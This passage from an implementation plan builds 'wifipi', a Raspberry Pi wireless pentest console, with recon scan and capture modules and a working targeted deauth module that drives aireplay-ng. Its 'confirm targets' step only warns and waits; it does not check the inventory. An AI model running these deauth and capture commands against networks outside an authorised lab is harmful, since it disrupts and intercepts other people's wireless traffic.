        full run() wrapper.

        Foreground modules usually don't use this; they run several commands
        in sequence inside run() instead.
        """
        raise NotImplementedError

    def run(self, ctx: RunContext) -> int:
        """Blocking entry point for foreground modules. Return 0 on success."""
        raise NotImplementedError
```

- [ ] **Step 2: Smoke test via existing module discovery test (added next task)**

No dedicated unit test for the empty base. The discovery test (Task 9's Step 4) exercises it via concrete subclasses.

- [ ] **Commit checkpoint** — "add Module base class + RunContext".

---

## Task 9: `console` — cmd2 App skeleton + module discovery

**Files:**
- Create: `wifipi/console.py`
- Create: `tests/test_module_discovery.py`

- [ ] **Step 1: Write failing discovery test (will pass as modules land in later tasks — expect 0 results for now)**

File: `tests/test_module_discovery.py`
```python
from wifipi.console import discover_modules


def test_discover_returns_list():
    mods = discover_modules()
    assert isinstance(mods, list)


def test_every_module_has_name_and_category():
    for mod in discover_modules():
        assert mod.NAME, f"{mod.__name__} missing NAME"
        assert mod.CATEGORY in {"recon", "attack", "post", "util"}, \
            f"{mod.NAME} has invalid category {mod.CATEGORY!r}"
```

- [ ] **Step 2: Implement `console.py` core**

File: `wifipi/console.py`
```python
"""Interactive REPL for wifipi. Built on cmd2."""

from __future__ import annotations

import importlib
import pkgutil
import textwrap
import time
from pathlib import Path
from typing import Any

import cmd2
from cmd2 import ansi

from . import inventory as inventory_mod
from .ifaces import InterfaceManager, Role, parse_iw_dev
from .jobs import JobManager, JobState
from .loot import LootManager
from .module import Module, RunContext
from .options import OptionSpec, OptionStore
from .procutil import missing_tools, run as run_proc


def discover_modules() -> list[type[Module]]:
    """Walk wifipi.modules.*, return every Module subclass."""
    import wifipi.modules as pkg

    found: list[type[Module]] = []
    for _, modname, _ in pkgutil.walk_packages(pkg.__path__, prefix=pkg.__name__ + "."):
        m = importlib.import_module(modname)
        for name in dir(m):
            obj = getattr(m, name)
            if (
                isinstance(obj, type)
                and issubclass(obj, Module)
                and obj is not Module
                and obj.NAME
            ):
                found.append(obj)
    # Deduplicate (a class can be imported into multiple modules).
    by_name: dict[str, type[Module]] = {}
    for cls in found:
        by_name[cls.NAME] = cls
    return sorted(by_name.values(), key=lambda c: c.NAME)


class WifipiApp(cmd2.Cmd):
    intro = ""   # we print our own banner in __main__
    prompt = "wifipi > "

    def __init__(self, repo_root: Path):
        super().__init__(allow_cli_args=False, include_py=False, include_ipy=False)
        self.repo_root = repo_root
        self.loot = LootManager(repo_root / "loot")
        self.ifaces = InterfaceManager()
        self.jobs = JobManager(on_finish=self._on_job_finish)
        self._modules: dict[str, type[Module]] = {
            cls.NAME: cls for cls in discover_modules()
        }
        self._globals = OptionStore(specs={})
        self._current: Module | None = None
        self._store: OptionStore | None = None
        self.inventory = inventory_mod.parse_inventory(repo_root / "lab-notes" / "inventory.md")

        # cmd2 niceties
        self.default_error = "[x] unknown command: {}"
        self.continuation_prompt = "... "

    # --- dynamic prompt -----------------------------------------------
    def _render_prompt(self) -> str:
        parts = ["wifipi"]
        running = self.jobs.running_count()
        if running:
            marker = f"[{running}j]"
            if running >= 3:
                marker = ansi.style(marker, fg=ansi.Fg.YELLOW)
            parts.append(marker)
        if self._current:
            parts.append(f"({self._current.NAME.split('/')[-1]})")
        return " ".join(parts) + " > "

    def postcmd(self, stop: bool, line: str) -> bool:  # type: ignore[override]
        self.prompt = self._render_prompt()
        return stop

    def preloop(self) -> None:
        self.prompt = self._render_prompt()

    def _on_job_finish(self, job) -> None:
        suffix = f"finished after {int(job.elapsed)}s"
        if job.state is JobState.FAILED:
            suffix = f"exited {job.returncode} after {int(job.elapsed)}s"
        elif job.state is JobState.KILLED:
            return  # killed-by-us: no alert needed
        line = ansi.style(
            f"[*] Job {job.id} ({job.name}) {suffix}  ->  {job.log_path.parent}",
            fg=ansi.Fg.CYAN,
        )
        try:
            self.async_alert(line)
        except Exception:
            print(line)

    # --- use / back / show ---------------------------------------------
    def do_use(self, args: cmd2.Statement) -> None:
        """use <module>  -- select a module by name."""
        name = args.arg_list[0] if args.arg_list else ""
        if not name:
            self.perror("usage: use <module>")
            return
        cls = self._modules.get(name)
        if cls is None:
            self.perror(f"no such module: {name}  (try `show modules`)")
            return
        missing = missing_tools(cls.REQUIRES_TOOLS)
        if missing:
            self.perror(f"missing tool(s) for {name}: {', '.join(missing)}")
            return
        self._current = cls()
        self._store = OptionStore(specs=cls.OPTIONS)
        self._store._global = self._globals._global  # share global dict
        self.poutput(f"[*] using {name}")

    def complete_use(self, text, line, begidx, endidx):
        return [n for n in self._modules if n.startswith(text)]

    def do_back(self, _args) -> None:
        """back  -- leave the current module."""
        self._current = None
        self._store = None

    def do_show(self, args: cmd2.Statement) -> None:
        """show modules | show options"""
        what = (args.arg_list[0] if args.arg_list else "").lower()
        if what == "modules":
            self._show_modules()
        elif what == "options":
            self._show_options()
        else:
            self.perror("usage: show modules | show options")

    def _show_modules(self) -> None:
        rows = [
            (cls.NAME, cls.CATEGORY, cls.DESCRIPTION)
            for cls in sorted(self._modules.values(), key=lambda c: c.NAME)
        ]
        width = max(len(r[0]) for r in rows)
        self.poutput(f"{'NAME'.ljust(width)}  CATEGORY  DESCRIPTION")
        for name, cat, desc in rows:
            self.poutput(f"{name.ljust(width)}  {cat.ljust(8)}  {desc}")

    def _show_options(self) -> None:
        if self._current is None or self._store is None:
            self.perror("no module selected (use `use <name>`)")
            return
        resolved = self._store.resolve_all()
        rows = []
        for key, spec in self._current.OPTIONS.items():
            r = resolved[key]
            val = "" if r.value is None else str(r.value)
            req = "yes" if spec.required else "no"
            rows.append((key, val, r.source, req, spec.description))
        if not rows:
            self.poutput("(no options)")
            return
        widths = [max(len(r[i]) for r in rows + [("KEY","VALUE","SOURCE","REQ","DESCRIPTION")]) for i in range(5)]
        hdr = ("KEY", "VALUE", "SOURCE", "REQ", "DESCRIPTION")
        line = "  ".join(h.ljust(w) for h, w in zip(hdr, widths))
        self.poutput(line)
        for r in rows:
            self.poutput("  ".join(s.ljust(w) for s, w in zip(r, widths)))

    def do_search(self, args: cmd2.Statement) -> None:
        """search <keyword>  -- filter modules by name or description."""
        kw = (args.arg_list[0] if args.arg_list else "").lower()
        if not kw:
            self.perror("usage: search <keyword>")
            return
        hits = [
            (c.NAME, c.DESCRIPTION) for c in self._modules.values()
            if kw in c.NAME.lower() or kw in c.DESCRIPTION.lower()
        ]
        if not hits:
            self.poutput("(no matches)")
            return
        for name, desc in sorted(hits):
            self.poutput(f"{name}  —  {desc}")

    def do_info(self, args: cmd2.Statement) -> None:
        """info <module>"""
        name = args.arg_list[0] if args.arg_list else ""
        cls = self._modules.get(name)
        if cls is None:
            self.perror(f"no such module: {name}")
            return
        self.poutput(f"{cls.NAME}  ({cls.CATEGORY})")
        self.poutput("")
        self.poutput(textwrap.fill(cls.DESCRIPTION, width=78))
        self.poutput("")
        self.poutput(f"Blocking:     {cls.BLOCKING}")
        self.poutput(f"Confirmation: {cls.REQUIRES_CONFIRMATION}")
        self.poutput(f"Tools:        {', '.join(cls.REQUIRES_TOOLS) or '-'}")
        self.poutput("Options:")
        for key, spec in cls.OPTIONS.items():
            req = "required" if spec.required else "optional"
            default = f" (default: {spec.default})" if spec.default is not None else ""
            self.poutput(f"  {key}  [{req}{default}]  — {spec.description}")

    # --- set / setg / unset --------------------------------------------
    def do_set(self, args: cmd2.Statement) -> None:
        """set KEY VALUE  -- set option on the current module."""
        if len(args.arg_list) < 2:
            self.perror("usage: set KEY VALUE")
            return
        key, value = args.arg_list[0], " ".join(args.arg_list[1:])
        if self._store is None:
            self.perror("no module selected (use `use <name>`)")
            return
        try:
            self._store.set_local(key, value)
        except KeyError as e:
            self.perror(str(e))

    def do_setg(self, args: cmd2.Statement) -> None:
        """setg KEY VALUE  -- set session-global option."""
        if len(args.arg_list) < 2:
            self.perror("usage: setg KEY VALUE")
            return
        key, value = args.arg_list[0], " ".join(args.arg_list[1:])
        self._globals.set_global(key, value)
        if self._store is not None:
            # Re-share the dict in case someone unset_locally
            self._store._global = self._globals._global

    def do_unset(self, args: cmd2.Statement) -> None:
        """unset KEY"""
        key = args.arg_list[0] if args.arg_list else ""
        if self._store is None:
            self.perror("no module selected")
            return
        self._store.unset_local(key)

    def do_unsetg(self, args: cmd2.Statement) -> None:
        """unsetg KEY"""
        key = args.arg_list[0] if args.arg_list else ""
        self._globals.unset_global(key)

    # --- run ------------------------------------------------------------
    def do_run(self, _args) -> None:
        """run  -- execute the current module."""
        if self._current is None or self._store is None:
            self.perror("no module selected")
            return
        mod = self._current
        missing = self._store.missing_required()
        if missing:
            self.perror(f"missing required options: {', '.join(missing)}")
            return

        opts = {k: r.value for k, r in self._store.resolve_all().items() if r.value is not None}

        if mod.REQUIRES_CONFIRMATION:
            self._confirm_attack(mod, opts)

        loot_dir = self.loot.new_run(mod.LOOT_SUBDIR or mod.CATEGORY, mod.NAME)
        log_path = loot_dir / "run.log"

        ctx = RunContext(
            options=opts,
            loot_dir=loot_dir,
            log_path=log_path,
            ifaces=self.ifaces,
            jobs=self.jobs,
            loot=self.loot,
        )

        if mod.BLOCKING:
            try:
                rc = mod.run(ctx)
            except KeyboardInterrupt:
                self.poutput("\n[*] cancelled")
                return
            if rc == 0:
                self.poutput(f"[+] {mod.NAME} finished  ->  {loot_dir}")
            else:
                self.perror(f"{mod.NAME} exited {rc}  (see {log_path})")
        else:
            argv = mod.build_argv(opts)
            job = self.jobs.start(name=mod.NAME, argv=argv, log_path=log_path)
            self.poutput(f"[+] Job {job.id} started: {mod.NAME}  ->  {loot_dir}")

    def _confirm_attack(self, mod: Module, opts: dict) -> None:
        self.pwarning(f"[!] {mod.NAME}")
        for key in ("BSSID", "CLIENT", "SSID", "CHANNEL"):
            if key in opts:
                self.pwarning(f"    {key}={opts[key]}")
        self.pwarning("    Confirm targets are in lab-notes/inventory.md. Firing in 3s...")
        confirm = self._globals.resolve_value("CONFIRM")
        if str(confirm).lower() != "false":
            time.sleep(3)
```

- [ ] **Step 3: Run discovery test — should pass with empty list (no modules yet)**

Run: `pytest tests/test_module_discovery.py -v`
Expected: `test_discover_returns_list` passes; `test_every_module_has_name_and_category` passes (no modules yet → no assertions trigger).

- [ ] **Commit checkpoint** — "add cmd2 app skeleton + module discovery".

---

## Task 10: `console` — interface commands (`ifaces`, `iface`)

**Files:**
- Modify: `wifipi/console.py` — append iface commands

- [ ] **Step 1: Add iface commands to `WifipiApp`**

Append to `wifipi/console.py`, inside class `WifipiApp`:
```python
    # --- iface / ifaces --------------------------------------------------
    def do_ifaces(self, _args) -> None:
        """ifaces  -- list wireless interfaces and role assignments."""
        try:
            out = run_proc(["iw", "dev"], capture_output=True, text=True).stdout
        except FileNotFoundError:
            self.perror("`iw` not installed — install with: apt install iw")
            return
        rows = parse_iw_dev(out)
        roles = {name: role for role, name in self.ifaces.all_assignments().items()}
        hdr = f"{'NAME'.ljust(12)} {'MODE'.ljust(10)} {'PHY'.ljust(8)} ROLE"
        self.poutput(hdr)
        for info in rows:
            role = roles.get(info.name)
            label = role.name if role else "-"
            self.poutput(f"{info.name.ljust(12)} {info.mode.ljust(10)} {info.phy.ljust(8)} {label}")

    def do_iface(self, args: cmd2.Statement) -> None:
        """iface set <role> <name> | up <role> | down <role> | auto"""
        if not args.arg_list:
            self.perror("usage: iface set|up|down|auto ...")
            return
        sub = args.arg_list[0]
        rest = args.arg_list[1:]
        if sub == "set":
            if len(rest) < 2:
                self.perror("usage: iface set <role> <name>")
                return
            try:
                role = Role.from_str(rest[0])
            except ValueError as e:
                self.perror(str(e))
                return
            self.ifaces.assign(role, rest[1])
            self.poutput(f"[*] {role.name} -> {rest[1]}")
        elif sub == "up":
            if not rest:
                self.perror("usage: iface up <role>")
                return
            self._iface_up(Role.from_str(rest[0]))
        elif sub == "down":
            if not rest:
                self.perror("usage: iface down <role>")
                return
            self._iface_down(Role.from_str(rest[0]))
        elif sub == "auto":
            self._iface_auto()
        else:
            self.perror("usage: iface set|up|down|auto ...")

    def _iw_dev(self) -> list:
        out = run_proc(["iw", "dev"], capture_output=True, text=True).stdout
        return parse_iw_dev(out)

    def _iface_up(self, role: Role) -> None:
        name = self.ifaces.get(role)
        if name is None:
            self.perror(f"{role.name} is not assigned (use `iface set {role.name.lower().replace('_iface','')} <name>`)")
            return
        if role is Role.MON:
            before = {i.name for i in self._iw_dev()}
            run_proc(["airmon-ng", "check", "kill"])
            run_proc(["airmon-ng", "start", name])
            after = self._iw_dev()
            # Prefer a newly-appeared monitor interface (airmon-ng renamed).
            new_mons = [i for i in after if i.mode == "monitor" and i.name not in before]
            if new_mons:
                new_name = new_mons[0].name
                if new_name != name:
                    self.ifaces.rename(old=name, new=new_name)
                self.poutput(f"[*] MON_IFACE -> {new_name} (monitor mode)")
                return
            # Otherwise: our interface went into monitor mode in place.
            for info in after:
                if info.name == name and info.mode == "monitor":
                    self.poutput(f"[*] MON_IFACE -> {name} (monitor mode in place)")
                    return
            self.perror(f"couldn't find a monitor-mode interface after airmon-ng start {name}")
        elif role is Role.ATTACK:
            self.ifaces.assign(Role.ATTACK, self.ifaces.get(Role.MON) or name)
            self.poutput(f"[*] ATTACK_IFACE -> {self.ifaces.get(Role.ATTACK)}")
        elif role is Role.AP:
            # Rogue-AP adapter is left in managed mode; hostapd binds it.
            run_proc(["ip", "link", "set", name, "up"])
            self.poutput(f"[*] AP_IFACE -> {name} (managed, ready for hostapd)")

    def _iface_down(self, role: Role) -> None:
        name = self.ifaces.get(role)
        if name is None:
            return
        if role is Role.MON:
            run_proc(["airmon-ng", "stop", name])
        else:
            run_proc(["ip", "link", "set", name, "down"])
        self.ifaces.clear(role)
        self.poutput(f"[*] {role.name} down")

    def _iface_auto(self) -> None:
        ifaces = [i for i in self._iw_dev() if i.name != "wlan0"]
        if not ifaces:
            # Fall back to wlan0 if that's all we have.
            ifaces = self._iw_dev()
        if not ifaces:
            self.perror("no wireless interfaces detected (plug USB adapter?)")
            return
        # Pick the first monitor-capable adapter (heuristic: not built-in wlan0).
        mon = next((i for i in ifaces if i.name != "wlan0"), ifaces[0])
        self.ifaces.assign(Role.MON, mon.name)
        self._iface_up(Role.MON)
        others = [i for i in self._iw_dev() if i.name != self.ifaces.get(Role.MON) and i.name != "wlan0"]
        if others:
            self.ifaces.assign(Role.AP, others[0].name)
            self.poutput(f"[*] AP_IFACE -> {others[0].name}")
            self.ifaces.assign(Role.ATTACK, self.ifaces.get(Role.MON))
        else:
            self.ifaces.assign(Role.ATTACK, self.ifaces.get(Role.MON))
            self.pwarning("[!] only one usable adapter — evil-twin will refuse to run")
```

- [ ] **Step 2: Smoke-check imports**

Run: `python3 -c "from wifipi.console import WifipiApp; print('ok')"`
Expected: `ok` (imports must not fail).

- [ ] **Commit checkpoint** — "add ifaces + iface commands".

---

## Task 11: `console` — jobs / status / loot / inventory commands + exit guard

**Files:**
- Modify: `wifipi/console.py`

- [ ] **Step 1: Add remaining commands and exit guard**

Append inside `WifipiApp`:
```python
    # --- jobs / status ---------------------------------------------------
    def do_jobs(self, _args) -> None:
        """jobs  -- list background jobs."""
        jobs = self.jobs.list()
        if not jobs:
            self.poutput("(no jobs)")
            return
        hdr = f"{'ID':>3}  {'MODULE'.ljust(24)} {'STATE'.ljust(8)} {'ELAPSED'.ljust(8)} PID"
        self.poutput(hdr)
        for j in jobs:
            self.poutput(
                f"{j.id:>3}  {j.name.ljust(24)} {j.state.value.ljust(8)} "
                f"{int(j.elapsed):>4}s    {j.pid}"
            )

    def do_kill(self, args: cmd2.Statement) -> None:
        """kill <id>  -- terminate a background job."""
        if not args.arg_list:
            self.perror("usage: kill <id>")
            return
        try:
            job_id = int(args.arg_list[0])
        except ValueError:
            self.perror("job id must be an integer")
            return
        if self.jobs.kill(job_id):
            self.poutput(f"[*] Job {job_id} killed")
        else:
            self.perror(f"no running job {job_id}")

    def do_status(self, _args) -> None:
        """status  -- interfaces + jobs + roles, all at once."""
        self.poutput("Interface roles:")
        assignments = self.ifaces.all_assignments()
        if not assignments:
            self.poutput("  (none — try `iface auto`)")
        else:
            for role, name in assignments.items():
                self.poutput(f"  {role.name.ljust(14)} {name}")
        self.poutput("")
        self.do_jobs(None)

    # --- loot ----------------------------------------------------------
    def do_loot(self, args: cmd2.Statement) -> None:
        """loot [category] | loot clean"""
        sub = args.arg_list[0] if args.arg_list else ""
        if sub == "clean":
            self.loot.clean()
            self.poutput("[*] loot/ cleaned")
            return
        cat = sub or None
        runs = self.loot.recent(category=cat, limit=20)
        if not runs:
            self.poutput("(no artefacts yet)")
            return
        for r in runs:
            self.poutput(f"  {r.relative_to(self.loot.root)}")

    # --- inventory -----------------------------------------------------
    def do_inventory(self, _args) -> None:
        """inventory  -- show MACs/BSSIDs from lab-notes/inventory.md."""
        inv = self.inventory
        self.poutput("BSSIDs in scope:")
        for m in inv.bssids or ["(none)"]:
            self.poutput(f"  {m}")
        self.poutput("Clients in scope:")
        for m in inv.clients or ["(none)"]:
            self.poutput(f"  {m}")

    # --- exit guard ----------------------------------------------------
    def do_exit(self, _args) -> bool:
        """exit  -- exit with a running-jobs guard."""
        running = self.jobs.running()
        if not running:
            return True
        names = ", ".join(j.name for j in running)
        self.pwarning(f"[!] {len(running)} background jobs still running: {names}")
        choice = input("    [k]ill them and exit, [d]etach (leave running), [c]ancel? ").strip().lower()
        if choice.startswith("k"):
            self.jobs.kill_all()
            return True
        if choice.startswith("d"):
            self.poutput("[*] detaching; jobs continue in the background")
            return True
        self.poutput("[*] cancelled")
        return False

    def do_quit(self, args) -> bool:
        return self.do_exit(args)
```

- [ ] **Step 2: Smoke-check imports**

Run: `python3 -c "from wifipi.console import WifipiApp; print('ok')"`
Expected: `ok`.

- [ ] **Commit checkpoint** — "add jobs, status, loot, inventory, exit guard".

---

## Task 12: `__main__` — root check, banner, launch

**Files:**
- Create: `wifipi/__main__.py`

- [ ] **Step 1: Entry point**

File: `wifipi/__main__.py`
```python
"""Entry point invoked via `python3 -m wifipi` or the `wifipi` shell wrapper."""

from __future__ import annotations

import os
import sys
from pathlib import Path

from cmd2 import ansi

from .console import WifipiApp

BANNER = r"""
 ╔════════════════════════════════════════════════════════════════╗
 ║ wifipi — WiFi Pineapple Equivalent on Raspberry Pi             ║
 ║ Authorised lab use only. Targets must be YOUR devices          ║
 ║ (see lab-notes/inventory.md). Dutch / EU law applies.           ║
 ╚════════════════════════════════════════════════════════════════╝
"""


def main() -> int:
    if os.geteuid() != 0:
        print(ansi.style("[x] wifipi must run as root (sudo ./wifipi.sh).", fg=ansi.Fg.RED), file=sys.stderr)
        return 1

    repo_root = Path(__file__).resolve().parent.parent
    print(ansi.style(BANNER, fg=ansi.Fg.RED))
    try:
        input("Press Enter to acknowledge and continue... ")
    except EOFError:
        return 0

    app = WifipiApp(repo_root=repo_root)
    print(f"[*] loaded {len(app._modules)} modules; "
          f"inventory: {len(app.inventory.bssids)} BSSIDs, {len(app.inventory.clients)} clients")
    return app.cmdloop()


if __name__ == "__main__":
    sys.exit(main() or 0)
```

- [ ] **Step 2: Smoke test (non-root, should fail cleanly)**

Run: `python3 -m wifipi`
Expected: `[x] wifipi must run as root (sudo ./wifipi.sh).` and exit status 1. No Python traceback.

- [ ] **Commit checkpoint** — "add __main__ entry point + banner".

---

## Task 13: `util/prereq-check` module

**Files:**
- Create: `wifipi/modules/util/prereq_check.py`

- [ ] **Step 1: Implement**

File: `wifipi/modules/util/prereq_check.py`
```python
"""util/prereq-check — verify required tools + enumerate wireless adapters."""

from __future__ import annotations

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import missing_tools, run as run_proc


TOOLS = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
         "hostapd", "dnsmasq", "iw", "iptables", "tcpdump"]


class PrereqCheck(Module):
    NAME = "util/prereq-check"
    CATEGORY = "util"
    DESCRIPTION = "Verify required tools and list wireless interfaces."
    OPTIONS: dict[str, OptionSpec] = {}
    REQUIRES_TOOLS: list[str] = []
    BLOCKING = True
    LOOT_SUBDIR = None

    def run(self, ctx: RunContext) -> int:
        missing = missing_tools(TOOLS)
        log_lines: list[str] = []

        if missing:
            log_lines.append(f"MISSING: {', '.join(missing)}")
            log_lines.append("Install: apt install -y kali-tools-wireless dnsmasq hostapd iptables tcpdump")
        else:
            log_lines.append("All required tools present.")

        iw = run_proc(["iw", "dev"], capture_output=True, text=True)
        log_lines.append("--- iw dev ---")
        log_lines.append(iw.stdout.strip() or "(no output)")

        lsusb = run_proc(["lsusb"], capture_output=True, text=True)
        log_lines.append("--- lsusb (wifi-ish entries) ---")
        for line in lsusb.stdout.splitlines():
            low = line.lower()
            if any(k in low for k in ("wireless", "wifi", "wi-fi", "802.11",
                                      "atheros", "realtek", "ralink", "mediatek")):
                log_lines.append(line)

        report = "\n".join(log_lines)
        ctx.log_path.write_text(report)
        print(report)
        print()
        print(f"Report saved: {ctx.log_path}")
        return 0 if not missing else 2
```

- [ ] **Step 2: Discovery smoke test**

Run: `pytest tests/test_module_discovery.py -v`
Expected: PASS. Discovery finds `util/prereq-check`.

- [ ] **Commit checkpoint** — "add util/prereq-check module".

---

## Task 14: `util/cleanup` module

**Files:**
- Create: `wifipi/modules/util/cleanup.py`

- [ ] **Step 1: Implement**

File: `wifipi/modules/util/cleanup.py`
```python
"""util/cleanup — revert monitor interfaces, flush iptables, restart NM."""

from __future__ import annotations

from wifipi.ifaces import Role, parse_iw_dev
from wifipi.module import Module, RunContext
from wifipi.procutil import run as run_proc


class Cleanup(Module):
    NAME = "util/cleanup"
    CATEGORY = "util"
    DESCRIPTION = "Tear down rogue AP, flush iptables, return adapters to managed."
    REQUIRES_TOOLS = ["iw", "iptables", "airmon-ng"]
    BLOCKING = True

    def run(self, ctx: RunContext) -> int:
        ln = ctx.log_path.open("a")

        def sh(argv: list[str]) -> None:
            ln.write(f"$ {' '.join(argv)}\n")
            ln.flush()
            run_proc(argv, stdout=ln, stderr=ln)

        # kill any rogue AP services we might have launched
        run_proc(["pkill", "-f", "hostapd"], stdout=ln, stderr=ln)
        run_proc(["pkill", "-f", "dnsmasq"], stdout=ln, stderr=ln)

        sh(["iptables", "-t", "nat", "-F", "POSTROUTING"])
        sh(["iptables", "-F", "FORWARD"])
        sh(["sysctl", "-w", "net.ipv4.ip_forward=0"])

        iw = run_proc(["iw", "dev"], capture_output=True, text=True)
        for info in parse_iw_dev(iw.stdout):
            if info.mode == "monitor":
                sh(["airmon-ng", "stop", info.name])

        run_proc(["systemctl", "restart", "NetworkManager"], stdout=ln, stderr=ln)

        ctx.ifaces.clear()
        ln.close()
        print("[*] cleanup done")
        return 0
```

- [ ] **Step 2: Discovery smoke test**

Run: `pytest tests/test_module_discovery.py -v`
Expected: PASS.

- [ ] **Commit checkpoint** — "add util/cleanup module".

---

## Task 15: `recon/scan` module (background)

**Files:**
- Create: `wifipi/modules/recon/scan.py`
- Create: `tests/test_module_argvs.py`

- [ ] **Step 1: Write failing argv test**

File: `tests/test_module_argvs.py`
```python
from wifipi.modules.recon.scan import Scan


def test_scan_argv_iface_only():
    m = Scan()
    argv = m.build_argv({"MON_IFACE": "wlan1mon"})
    assert argv == ["airodump-ng", "wlan1mon"]


def test_scan_argv_with_channel():
    m = Scan()
    argv = m.build_argv({"MON_IFACE": "wlan1mon", "CHANNEL": "11"})
    assert argv == ["airodump-ng", "-c", "11", "wlan1mon"]
```

- [ ] **Step 2: Implement**

File: `wifipi/modules/recon/scan.py`
```python
"""recon/scan — channel-hopping airodump on MON_IFACE."""

from __future__ import annotations

from wifipi.ifaces import Role
from wifipi.module import Module
from wifipi.options import OptionSpec


class Scan(Module):
    NAME = "recon/scan"
    CATEGORY = "recon"
    DESCRIPTION = "airodump-ng channel-hop scan on MON_IFACE."
    OPTIONS = {
        "CHANNEL": OptionSpec(required=False, default=None,
                              description="Lock scan to one channel (else hop)."),
    }
    REQUIRES_TOOLS = ["airodump-ng"]
    BLOCKING = False
    LOOT_SUBDIR = "scans"

    def build_argv(self, opts: dict) -> list[str]:
        iface = opts.get("MON_IFACE")
        if not iface:
            raise RuntimeError("MON_IFACE not set (run `iface auto` or `iface set mon ...`)")
        argv = ["airodump-ng"]
        channel = opts.get("CHANNEL")
        if channel:
            argv += ["-c", str(channel)]
        argv.append(iface)
        return argv
```

- [ ] **Step 3: Pipe the role into `opts` at run-time**

The console currently puts only the module's declared OPTIONS into `opts`. Background modules need the role value too. Modify `do_run` in `wifipi/console.py` to inject roles before calling `build_argv`:

Find the `do_run` method and change the block that builds `opts`:

Replace:
```python
        opts = {k: r.value for k, r in self._store.resolve_all().items() if r.value is not None}
```

With:
```python
        opts = {k: r.value for k, r in self._store.resolve_all().items() if r.value is not None}
        for role in Role:
            val = self.ifaces.get(role)
            if val is not None:
                opts[role.value] = val
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_module_argvs.py tests/test_module_discovery.py -v`
Expected: 2 passed (argv) + discovery passes.

- [ ] **Commit checkpoint** — "add recon/scan module + role injection".

---

## Task 16: `recon/target` module (background)

**Files:**
- Create: `wifipi/modules/recon/target.py`
- Modify: `tests/test_module_argvs.py`

- [ ] **Step 1: Add argv test**

Append to `tests/test_module_argvs.py`:
```python
from wifipi.modules.recon.target import Target


def test_target_argv():
    m = Target()
    argv = m.build_argv({
        "BSSID": "AA:BB:CC:11:22:33",
        "CHANNEL": "11",
        "MON_IFACE": "wlan1mon",
        "OUTPUT_PREFIX": "/tmp/cap",
    })
    assert argv == [
        "airodump-ng", "-c", "11", "--bssid", "AA:BB:CC:11:22:33",
        "-w", "/tmp/cap", "wlan1mon",
    ]
```

- [ ] **Step 2: Implement**

File: `wifipi/modules/recon/target.py`
```python
"""recon/target — airodump locked to one BSSID + channel."""

from __future__ import annotations

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec


class Target(Module):
    NAME = "recon/target"
    CATEGORY = "recon"
    DESCRIPTION = "Channel-locked capture for one AP. Writes <prefix>-NN.cap."
    OPTIONS = {
        "BSSID": OptionSpec(required=True, description="Target AP BSSID.", kind="bssid"),
        "CHANNEL": OptionSpec(required=True, description="Target AP channel.", kind="int"),
        "OUTPUT_PREFIX": OptionSpec(required=False, default=None,
                                    description="Capture filename prefix (default: loot dir/capture)."),
    }
    REQUIRES_TOOLS = ["airodump-ng"]
    BLOCKING = False
    LOOT_SUBDIR = "scans"

    def build_argv(self, opts: dict) -> list[str]:
        iface = opts.get("MON_IFACE")
        if not iface:
            raise RuntimeError("MON_IFACE not set")
        prefix = opts.get("OUTPUT_PREFIX") or "capture"
        return [
            "airodump-ng",
            "-c", str(opts["CHANNEL"]),
            "--bssid", opts["BSSID"],
            "-w", prefix,
            iface,
        ]
```

- [ ] **Step 3: Adjust `do_run` for background modules to `cd` into the loot dir before launching**

In `wifipi/console.py`, `do_run`, the background branch. Replace:
```python
            argv = mod.build_argv(opts)
            job = self.jobs.start(name=mod.NAME, argv=argv, log_path=log_path)
```

With:
```python
            # Default OUTPUT_PREFIX to something under the loot dir so captures
            # land alongside the run log.
            if "OUTPUT_PREFIX" in mod.OPTIONS and opts.get("OUTPUT_PREFIX") is None:
                opts["OUTPUT_PREFIX"] = str(loot_dir / "capture")
            argv = mod.build_argv(opts)
            job = self.jobs.start(name=mod.NAME, argv=argv, log_path=log_path)
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_module_argvs.py -v`
Expected: 3 passed.

- [ ] **Commit checkpoint** — "add recon/target module".

---

## Task 17: `attack/deauth-targeted` module (foreground, confirmation)

**Files:**
- Create: `wifipi/modules/attack/deauth_targeted.py`
- Modify: `tests/test_module_argvs.py`

- [ ] **Step 1: Add argv test**

Append to `tests/test_module_argvs.py`:
```python
from wifipi.modules.attack.deauth_targeted import DeauthTargeted


def test_deauth_targeted_argv():
    m = DeauthTargeted()
    argv = m.build_argv({
        "BSSID": "AA:BB:CC:11:22:33",
        "CLIENT": "DD:EE:FF:44:55:66",
        "CHANNEL": "11",
        "COUNT": "10",
        "MON_IFACE": "wlan1mon",
    })
    assert argv == [
        "aireplay-ng", "--deauth", "10",
        "-a", "AA:BB:CC:11:22:33",
        "-c", "DD:EE:FF:44:55:66",
        "wlan1mon",
    ]
```

- [ ] **Step 2: Implement**

File: `wifipi/modules/attack/deauth_targeted.py`
```python
"""attack/deauth-targeted — disconnect one client from one AP."""

from __future__ import annotations

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import run as run_proc


class DeauthTargeted(Module):
    NAME = "attack/deauth-targeted"
    CATEGORY = "attack"
    DESCRIPTION = "Targeted 802.11 deauth burst: kicks ONE client off ONE AP."
    OPTIONS = {
        "BSSID":   OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CLIENT":  OptionSpec(required=True,  description="Victim MAC.", kind="mac"),
        "CHANNEL": OptionSpec(required=True,  description="AP channel.", kind="int"),
        "COUNT":   OptionSpec(required=False, default="10",
                              description="Deauth frames to send.", kind="int"),
    }
    REQUIRES_TOOLS = ["aireplay-ng", "iw"]
    BLOCKING = True
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "attacks"

    def build_argv(self, opts: dict) -> list[str]:
        iface = opts["MON_IFACE"]
        return [
            "aireplay-ng", "--deauth", str(opts["COUNT"]),
            "-a", opts["BSSID"],
            "-c", opts["CLIENT"],
            iface,
        ]

    def run(self, ctx: RunContext) -> int:
        iface = ctx.options.get("MON_IFACE")
        if not iface:
            print("[x] MON_IFACE not set")
            return 2
        run_proc(["iw", "dev", iface, "set", "channel", str(ctx.options["CHANNEL"])])
        argv = self.build_argv(ctx.options)
        # Foreground: let aireplay-ng print to the user's terminal live.
        return run_proc(argv).returncode
```

- [ ] **Step 3: Run tests**

Run: `pytest tests/test_module_argvs.py -v`
Expected: 4 passed.

